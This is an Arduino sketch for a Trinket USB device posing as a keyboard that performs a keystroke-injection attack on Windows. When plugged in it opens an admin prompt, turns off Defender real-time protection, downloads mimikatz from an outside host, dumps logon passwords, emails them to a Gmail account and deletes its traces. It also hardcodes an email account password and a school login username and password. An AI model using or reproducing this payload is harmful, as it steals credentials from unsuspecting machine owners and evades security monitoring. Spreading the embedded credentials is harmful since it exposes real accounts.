#include <TrinketKeyboard.h>

#define BUTTON 2
unsigned long timer=0;
boolean lastState=0;



void setup()
{
  // button pins as inputs
  pinMode(BUTTON, INPUT);
  digitalWrite(BUTTON, HIGH);
  pinMode(1, OUTPUT);
  pinMode(0, OUTPUT);

  TrinketKeyboard.begin();
  

  if(digitalRead(BUTTON)==HIGH) {
    mimiKatz();
      fakeDelay(150000);
  } else {
    while  (digitalRead(BUTTON)==LOW) {
      digitalWrite(1, HIGH);
      digitalWrite(0, HIGH);
      TrinketKeyboard.poll();
      delay(1);
    }
    digitalWrite(1, LOW);
    digitalWrite(0, LOW);
  }
}

void mimiKatz() {

  
      fakeDelay(3500);
  TrinketKeyboard.pressKey(0, KEYCODE_ESC);
      fakeRelease();
      fakeDelay(250);
  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_CONTROL, KEYCODE_ESC);
      fakeRelease();
      fakeDelay(1000);
  TrinketKeyboard.print(F("cmd"));
      fakeDelay(1250);
  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_CONTROL | KEYCODE_MOD_LEFT_SHIFT, KEYCODE_ENTER);
      fakeRelease();
      fakeDelay(3500);
  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_ALT, KEYCODE_Y);
      fakeRelease();
      fakeDelay(1000);
  TrinketKeyboard.print(F("powershell Set-MpPreference -DisableRealtimeMonitoring $true"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://mimikatz.x10host.com/mimikatz/Win32/mimikatz.exe','c:\\pw.exe');  }else{ (new-object System.Net.WebClient).Download"));
  TrinketKeyboard.print(F("File('http://mimikatz.x10host.com/mimikatz/x64/mimikatz.exe','c:\\pw.exe');}"));
      fakeEnter();
      fakeDelay(1000);
  TrinketKeyboard.print(F("c:\\pw.exe > c:\\pwlog.txt & type pwlog.txt;"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("privilege::debug"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("sekurlsa::logonPasswords full"));
      fakeEnter();
      fakeDelay(500);
  TrinketKeyboard.print(F("exit"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("del c:\\pw.exe"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("powershell Set-MpPreference -DisableRealtimeMonitoring $false"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("powershell Send-MailMessage -Attachments 'c:\\pwlog.txt' -Body 'Attached is your report.' -Credential (New-Object System.Management.Automation.PSCredential('cbreaker3435', (ConvertTo"));
  TrinketKeyboard.print(F("-SecureString '438579088' -AsPlainText -Force))) -From 'cbreaker3435@gmail.com' -Port 587 -SmtpServer 'smtp.gmail.com' -Subject $env:computername -To 'cbreaker3435@gmail.com' -UseSsl"));
      fakeEnter();
      fakeDelay(1000);
  TrinketKeyboard.print(F("del c:\\pwlog.txt"));
      fakeEnter();
      fakeDelay(250);
  TrinketKeyboard.print(F("exit"));
      fakeEnter();
      fakeDelay(250);
  
  digitalWrite(1, HIGH);
  digitalWrite(0, HIGH);

}

void username() {
  digitalWrite(1, HIGH);
  TrinketKeyboard.print(F("jalaee8416@hwdsb.on.ca"));
      fakeEnter();
      fakeRelease();
      fakeDelay(1000);
  digitalWrite(1, LOW);
}

void password() {
  digitalWrite(0, HIGH);
  TrinketKeyboard.print(F("jalaee8416"));
  TrinketKeyboard.pressKey(0, KEYCODE_TAB);
      fakeRelease();
  TrinketKeyboard.print(F("00880088"));
      fakeEnter();
      fakeRelease();
      fakeDelay(1000);
  digitalWrite(0, LOW);
}
 
void loop() {
  TrinketKeyboard.poll();

  if(digitalRead(BUTTON)==LOW) {

      if(timer+750<millis()&&lastState==1) {
        password();
        lastState=2;
      }


      if (lastState==0) {
        timer=millis();
        lastState=1;
      }

    } else {
      if((lastState==1||lastState==2)&&(!(timer+750<millis()))) {
      username();
      }
    lastState=0;
    }
  
delay(1);

}

void fakeDelay(int mSec) {
  timer=millis();
  while(timer+mSec>millis()) {
        TrinketKeyboard.poll();
        delay(1);
      }
}

void fakeRelease() {
  TrinketKeyboard.pressKey(0, 0);
}

void fakeEnter() {
  fakeDelay(250);
  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  fakeRelease();
}

